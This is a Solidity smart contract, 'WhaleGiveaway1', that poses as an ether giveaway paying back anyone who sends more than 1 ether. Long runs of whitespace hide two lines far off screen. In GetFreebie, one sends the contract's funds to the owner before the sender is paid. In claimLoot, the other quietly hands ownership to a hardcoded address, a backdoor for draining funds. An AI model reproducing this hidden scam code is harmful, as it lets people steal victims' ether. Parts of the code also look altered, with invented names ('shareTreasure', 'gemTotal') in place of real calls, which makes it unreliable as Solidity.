// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract WhaleGiveaway1
{
    address public Gamemaster = msg.sender;

    function()
    public
    payable
    {

    }

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Gamemaster.shareTreasure(this.gemTotal);
            msg.sender.shareTreasure(this.gemTotal);
        }
    }

    function claimLoot()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Gamemaster=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
        require(msg.sender == Gamemaster);
        Gamemaster.shareTreasure(this.gemTotal);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Gamemaster);
        adr.call.value(msg.value)(data);
    }
}